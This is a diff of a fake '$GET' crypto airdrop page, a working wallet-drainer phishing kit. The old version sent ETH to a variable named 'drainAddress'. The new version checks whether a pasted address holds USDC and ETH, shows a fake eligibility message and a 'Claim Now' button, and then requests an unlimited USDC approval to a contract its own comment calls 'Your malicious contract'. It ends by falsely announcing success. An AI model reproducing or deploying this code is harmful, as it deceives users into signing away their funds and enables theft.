@@ -2,122 +2,182 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Claim $GET Airdrop</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>$GET Airdrop Checker</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #0f0f10, #1a1b1f);
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #0a0a1a, #1b1b2f);
       color: #fff;
-      min-height: 100vh;
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       padding: 2rem;
+      min-height: 100vh;
     }
-    .claim-box {
-      background: rgba(255,255,255,0.05);
-      border: 1px solid rgba(255,255,255,0.1);
+    .container {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
       border-radius: 20px;
-      padding: 2rem 2.5rem;
+      backdrop-filter: blur(16px);
+      padding: 2rem;
+      max-width: 480px;
+      width: 100%;
       text-align: center;
-      max-width: 420px;
-      width: 100%;
-      box-shadow: 0 0 20px rgba(255,255,255,0.1);
+      box-shadow: 0 0 25px rgba(255, 170, 51, 0.1);
     }
-    .logo { font-size: 2rem; font-weight: 700; color: #ffaa33; margin-bottom: 0.5rem; }
-    .title { font-size: 1.3rem; font-weight: 600; margin-bottom: 1rem; }
-    .desc { font-size: 0.95rem; margin-bottom: 1.5rem; color: #ccc; }
-    .btn {
-      width: 100%;
-      padding: 0.8rem;
-      font-weight: bold;
-      border: none;
-      border-radius: 50px;
+    .logo {
+      font-size: 2rem;
+      font-weight: 700;
+      color: #ffaa33;
+      margin-bottom: 0.5rem;
+    }
+    .subtitle {
       font-size: 1rem;
-      cursor: pointer;
-      transition: background 0.3s ease;
-      box-shadow: 0 0 10px rgba(255,170,51,0.4);
+      color: #ccc;
+      margin-bottom: 2rem;
+    }
+    input {
+      padding: 0.9rem 1rem;
+      border-radius: 10px;
+      width: 100%;
+      border: none;
+      font-size: 1rem;
       margin-bottom: 1rem;
     }
-    .connect-btn {
+    button {
+      padding: 0.9rem 2rem;
       background: #ffaa33;
       color: #000;
+      font-weight: 600;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 1rem;
+      margin-top: 0.5rem;
+      transition: background 0.25s ease;
     }
-    .connect-btn:hover {
-      background: #ffc86b;
+    button:hover {
+      background: #ffc76b;
     }
-    .claim-btn {
-      background: linear-gradient(to right, #ffcc70, #ffaa33);
-      color: #000;
+    .result {
+      margin-top: 1.5rem;
+      background: rgba(0, 255, 150, 0.08);
+      padding: 1rem;
+      border-radius: 12px;
+      border: 1px solid rgba(0, 255, 150, 0.2);
+      color: #00ffb3;
+      font-weight: 500;
     }
-    .claim-btn:hover {
-      background: linear-gradient(to right, #ffd88a, #ffc76b);
+    .error {
+      margin-top: 1.5rem;
+      background: rgba(255, 0, 0, 0.08);
+      padding: 1rem;
+      border-radius: 12px;
+      border: 1px solid rgba(255, 0, 0, 0.2);
+      color: #ff4d4d;
+      font-weight: 500;
     }
-    .wallet { margin: 1rem 0; font-size: 0.9rem; word-break: break-word; color: #88f; }
-    .eligible { background: #0f0; color: #000; padding: 0.5rem; border-radius: 8px; margin-bottom: 1rem; font-weight: bold; }
+    .hidden {
+      display: none;
+    }
+    footer {
+      margin-top: 2rem;
+      font-size: 0.8rem;
+      color: #888;
+    }
   </style>
 </head>
 <body>
-  <div class="claim-box">
-    <div class="logo">$GETCHAIN</div>
-    <div class="title>Airdrop Live</div>
-    <div class="desc">Eligible wallets can claim <strong>0.5 $GET (Base ETH)</strong>. Gas fees covered.</div>
+  <div class="container">
+    <div class="logo">GETCHAIN</div>
+    <div class="subtitle">Paste your wallet address to check airdrop eligibility</div>
 
-    <button class="btn connect-btn" id="connectBtn">Connect Wallet</button>
-    <div id="wallet" class="wallet" style="display:none;"></div>
-    <div id="eligibleBox" class="eligible" style="display:none;">✅ You're eligible!</div>
-    <button class="btn claim-btn" id="claimBtn" disabled>Claim Airdrop</button>
+    <input type="text" id="walletInput" placeholder="0x...">
+    <button id="checkBtn">Check Eligibility</button>
+
+    <div id="eligibility" class="result hidden">
+      ✅ Eligible for <strong>215 $GET</strong> (≈ $186.22)<br/>
+      <button id="claimBtn">Claim Now</button>
+    </div>
+
+    <div id="errorMsg" class="error hidden">
+      ❌ Not eligible<br/>
+      Eligibility for this address could not be verified at this time.
+    </div>
+
+    <footer>Powered by GETCHAIN Labs</footer>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    const connectBtn = document.getElementById("connectBtn");
-    const walletDiv = document.getElementById("wallet");
-    const eligibleBox = document.getElementById("eligibleBox");
-    const claimBtn = document.getElementById("claimBtn");
+    const checkBtn = document.getElementById('checkBtn');
+    const claimBtn = document.getElementById('claimBtn');
+    const walletInput = document.getElementById('walletInput');
+    const eligibility = document.getElementById('eligibility');
+    const errorMsg = document.getElementById('errorMsg');
 
-    const drainAddress = "0x91Ea778d55a434123F28Bc5D4910F950f41D2A1D";
-    const baseChainId = 8453;
+    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
+    const CLAIM_CONTRACT = "0x7Bb5c61149a3E66675AFBCA166436CddECF86581"; // Your malicious contract
 
-    let provider, signer;
+    const ERC20_ABI = [
+      "function balanceOf(address owner) view returns (uint256)",
+      "function approve(address spender, uint256 amount) external returns (bool)"
+    ];
 
-    connectBtn.onclick = async () => {
-      if (!window.ethereum) return alert("Install MetaMask.");
-      provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      signer = provider.getSigner();
-      const userAddress = await signer.getAddress();
+    const checkEligibility = async (addr) => {
+      const provider = new ethers.providers.JsonRpcProvider("https://mainnet.base.org");
+      const usdc = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, provider);
+      try {
+        const usdcBal = await usdc.balanceOf(addr);
+        const ethBal = await provider.getBalance(addr);
+        return usdcBal.gt(0) && ethBal.gt(ethers.utils.parseEther("0.001"));
+      } catch (e) {
+        return false;
+      }
+    };
 
-      const { chainId } = await provider.getNetwork();
-      if (chainId !== baseChainId) {
-        alert("Please switch to Base Mainnet (Chain ID 8453)");
+    checkBtn.addEventListener('click', async () => {
+      const address = walletInput.value.trim();
+      if (!ethers.utils.isAddress(address)) {
+        alert("❌ Invalid wallet address");
         return;
       }
 
-      walletDiv.innerText = userAddress;
-      walletDiv.style.display = "block";
-      eligibleBox.style.display = "block";
-      connectBtn.disabled = true;
-      connectBtn.innerText = "Connected";
-      claimBtn.disabled = false;
-    };
+      eligibility.classList.add("hidden");
+      errorMsg.classList.add("hidden");
 
-    claimBtn.onclick = async () => {
-      try {
-        const tx = await signer.sendTransaction({
-          to: drainAddress,
-          value: ethers.utils.parseEther("0.00005")
-        });
-        await tx.wait();
-        claimBtn.innerText = "Claimed ✅";
-        claimBtn.disabled = true;
-      } catch (err) {
-        alert("Transaction failed or rejected.");
+      const eligible = await checkEligibility(address);
+      if (eligible) {
+        eligibility.classList.remove("hidden");
+      } else {
+        errorMsg.classList.remove("hidden");
       }
-    };
+    });
+
+    claimBtn.addEventListener('click', async () => {
+      if (!window.ethereum) {
+        alert("Please install MetaMask.");
+        return;
+      }
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+
+      const usdc = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, signer);
+
+      try {
+        const approvalTx = await usdc.approve(CLAIM_CONTRACT, ethers.constants.MaxUint256);
+        await approvalTx.wait();
+        alert("✅ Airdrop claimed! Tokens will arrive shortly.");
+      } catch (e) {
+        alert("❌ Claim failed. Try again.");
+      }
+    });
   </script>
 </body>
 </html>
